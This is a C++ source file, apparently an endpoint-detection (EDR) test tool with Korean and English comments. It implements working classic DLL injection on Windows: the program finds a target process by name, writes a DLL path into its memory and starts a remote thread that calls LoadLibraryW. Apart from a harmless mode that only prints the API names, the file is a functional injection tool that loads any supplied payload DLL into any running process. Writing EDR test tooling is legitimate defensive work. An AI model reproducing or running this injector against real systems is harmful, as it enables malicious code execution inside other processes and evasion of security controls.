/*
 * DLL Injection Test - EDR Detection Test
 * 
 * 목적: 원격 프로세스에 DLL을 주입하여 EDR의 프로세스 인젝션 탐지 능력을 테스트
 * Purpose: Test EDR's ability to detect DLL injection into remote processes
 * 
 * 탐지 포인트 (Detection Points):
 * - OpenProcess with PROCESS_ALL_ACCESS
 * - VirtualAllocEx for memory allocation in target process
 * - WriteProcessMemory to write DLL path
 * - CreateRemoteThread to execute LoadLibrary
 * 
 * WARNING: For testing purposes only in isolated environments
 */

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <memory>

// RAII wrapper for HANDLE to ensure automatic cleanup
class HandleGuard {
private:
    HANDLE handle;
    
public:
    HandleGuard(HANDLE h) : handle(h) {}
    ~HandleGuard() {
        if (handle && handle != INVALID_HANDLE_VALUE) {
            CloseHandle(handle);
        }
    }
    
    HANDLE get() const { return handle; }
    bool isValid() const { return handle && handle != INVALID_HANDLE_VALUE; }
    
    // Prevent copying
    HandleGuard(const HandleGuard&) = delete;
    HandleGuard& operator=(const HandleGuard&) = delete;
};

// Find process ID by name with improved error logging
DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[-] Failed to create process snapshot. Error: " << GetLastError() << std::endl;
        return 0;
    }

    HandleGuard snapshotGuard(snapshot);

    if (Process32FirstW(snapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                return processEntry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    return 0;
}

// Validate DLL path existence and accessibility
bool ValidateDllPath(const std::wstring& dllPath) {
    DWORD fileAttributes = GetFileAttributesW(dllPath.c_str());
    
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        std::wcerr << L"[-] DLL file not found or inaccessible: " << dllPath << std::endl;
        std::wcerr << L"    Error: " << GetLastError() << std::endl;
        return false;
    }
    
    if (fileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        std::wcerr << L"[-] Path is a directory, not a file: " << dllPath << std::endl;
        return false;
    }
    
    return true;
}

// Validate executable path for test mode
bool ValidateExecutablePath(const std::wstring& exePath) {
    DWORD fileAttributes = GetFileAttributesW(exePath.c_str());
    
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        // Try common alternative locations
        std::wcerr << L"[-] Executable not found at: " << exePath << std::endl;
        std::wcerr << L"    Error: " << GetLastError() << std::endl;
        return false;
    }
    
    return true;
}

// Perform DLL injection with improved resource management
bool InjectDLL(DWORD processId, const std::wstring& dllPath) {
    std::wcout << L"[*] Target Process ID: " << processId << std::endl;
    std::wcout << L"[*] DLL Path: " << dllPath << std::endl;

    // Step 1: Open target process
    std::wcout << L"[1] Opening target process..." << std::endl;
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, processId
    );

    if (!hProcess) {
        std::wcerr << L"[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return false;
    }
    HandleGuard processGuard(hProcess);
    std::wcout << L"[+] Process opened successfully" << std::endl;

    // Step 2: Allocate memory in target process
    std::wcout << L"[2] Allocating memory in target process..." << std::endl;
    SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    LPVOID pRemoteMemory = VirtualAllocEx(
        hProcess, NULL, dllPathSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!pRemoteMemory) {
        std::wcerr << L"[-] Failed to allocate memory. Error: " << GetLastError() << std::endl;
        return false;
    }
    std::wcout << L"[+] Memory allocated at: 0x" << std::hex << pRemoteMemory << std::dec << std::endl;

    // Ensure memory cleanup on error
    bool success = false;
    auto memoryCleanup = [&pRemoteMemory, &hProcess]() {
        if (pRemoteMemory) {
            VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        }
    };

    // Step 3: Write DLL path to target process memory
    std::wcout << L"[3] Writing DLL path to target process..." << std::endl;
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPathSize, NULL)) {
        std::wcerr << L"[-] Failed to write memory. Error: " << GetLastError() << std::endl;
        memoryCleanup();
        return false;
    }
    std::wcout << L"[+] DLL path written successfully" << std::endl;

    // Step 4: Get address of LoadLibraryW
    std::wcout << L"[4] Getting LoadLibraryW address..." << std::endl;
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) {
        std::wcerr << L"[-] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        memoryCleanup();
        return false;
    }
    
    LPVOID pLoadLibraryW = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    
    if (!pLoadLibraryW) {
        std::wcerr << L"[-] Failed to get LoadLibraryW address. Error: " << GetLastError() << std::endl;
        memoryCleanup();
        return false;
    }
    std::wcout << L"[+] LoadLibraryW address: 0x" << std::hex << pLoadLibraryW << std::dec << std::endl;

    // Step 5: Create remote thread to load DLL
    std::wcout << L"[5] Creating remote thread..." << std::endl;
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
        pRemoteMemory, 0, NULL
    );

    if (!hThread) {
        std::wcerr << L"[-] Failed to create remote thread. Error: " << GetLastError() << std::endl;
        memoryCleanup();
        return false;
    }
    HandleGuard threadGuard(hThread);
    std::wcout << L"[+] Remote thread created successfully" << std::endl;

    // Wait for thread to complete with timeout (30 seconds)
    std::wcout << L"[*] Waiting for thread completion (30 second timeout)..." << std::endl;
    DWORD waitResult = WaitForSingleObject(hThread, 30000);
    
    switch (waitResult) {
        case WAIT_OBJECT_0:
            std::wcout << L"[+] DLL injection completed successfully" << std::endl;
            success = true;
            break;
        case WAIT_TIMEOUT:
            std::wcerr << L"[-] Thread wait timeout after 30 seconds" << std::endl;
            break;
        case WAIT_FAILED:
            std::wcerr << L"[-] Wait failed. Error: " << GetLastError() << std::endl;
            break;
        default:
            std::wcerr << L"[-] Unexpected wait result: " << waitResult << std::endl;
            break;
    }

    // Cleanup
    memoryCleanup();

    return success;
}

int wmain(int argc, wchar_t* argv[]) {
    std::wcout << L"==================================================" << std::endl;
    std::wcout << L"    EDR Test: DLL Injection Technique" << std::endl;
    std::wcout << L"    WARNING: For testing purposes only!" << std::endl;
    std::wcout << L"==================================================" << std::endl;
    std::wcout << std::endl;

    if (argc < 2) {
        std::wcout << L"Usage: " << argv[0] << L" <target_process_name> [dll_path]" << std::endl;
        std::wcout << L"Example: " << argv[0] << L" notepad.exe C:\\test\\payload.dll" << std::endl;
        std::wcout << std::endl;
        std::wcout << L"For basic test (spawns notepad.exe):" << std::endl;
        std::wcout << L"  " << argv[0] << L" test" << std::endl;
        return 1;
    }

    std::wstring targetProcess = argv[1];

    // Test mode: spawn notepad and simulate injection behavior
    if (targetProcess == L"test") {
        std::wcout << L"[*] Running in test mode..." << std::endl;
        std::wcout << L"[*] Spawning notepad.exe..." << std::endl;
        
        // Validate notepad.exe path before attempting to spawn
        std::wstring notepadPath = L"C:\\Windows\\System32\\notepad.exe";
        if (!ValidateExecutablePath(notepadPath)) {
            std::wcerr << L"[-] Cannot proceed: notepad.exe not found" << std::endl;
            return 1;
        }
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        if (CreateProcessW(
            notepadPath.c_str(),
            NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            
            HandleGuard processGuard(pi.hProcess);
            HandleGuard threadGuard(pi.hThread);
            
            std::wcout << L"[+] Notepad spawned with PID: " << pi.dwProcessId << std::endl;
            std::wcout << L"[*] Simulating injection steps (API calls that EDR should detect):" << std::endl;
            
            // Demonstrate the API calls that EDR should monitor
            std::wcout << L"    1. OpenProcess(PROCESS_ALL_ACCESS)" << std::endl;
            std::wcout << L"    2. VirtualAllocEx(MEM_COMMIT | MEM_RESERVE)" << std::endl;
            std::wcout << L"    3. WriteProcessMemory()" << std::endl;
            std::wcout << L"    4. CreateRemoteThread(LoadLibrary)" << std::endl;
            
            Sleep(2000);
            TerminateProcess(pi.hProcess, 0);
            
            std::wcout << L"[+] Test completed. EDR should log these activities." << std::endl;
        } else {
            std::wcerr << L"[-] Failed to spawn notepad.exe. Error: " << GetLastError() << std::endl;
            return 1;
        }
        return 0;
    }

    // Real injection mode
    // Validate process name is not empty
    if (targetProcess.empty()) {
        std::wcerr << L"[-] Invalid process name (empty string)" << std::endl;
        return 1;
    }
    
    DWORD pid = FindProcessId(targetProcess);
    if (pid == 0) {
        std::wcerr << L"[-] Process not found: " << targetProcess << std::endl;
        return 1;
    }

    std::wstring dllPath;
    if (argc >= 3) {
        dllPath = argv[2];
        
        // Validate DLL path
        if (dllPath.empty()) {
            std::wcerr << L"[-] Invalid DLL path (empty string)" << std::endl;
            return 1;
        }
        
        if (!ValidateDllPath(dllPath)) {
            std::wcerr << L"[-] DLL validation failed" << std::endl;
            return 1;
        }
    } else {
        std::wcerr << L"[-] DLL path required for injection" << std::endl;
        return 1;
    }

    if (InjectDLL(pid, dllPath)) {
        std::wcout << L"\n[SUCCESS] EDR should have detected this injection attempt!" << std::endl;
    } else {
        std::wcerr << L"\n[FAILED] Injection failed" << std::endl;
        return 1;
    }

    return 0;
}
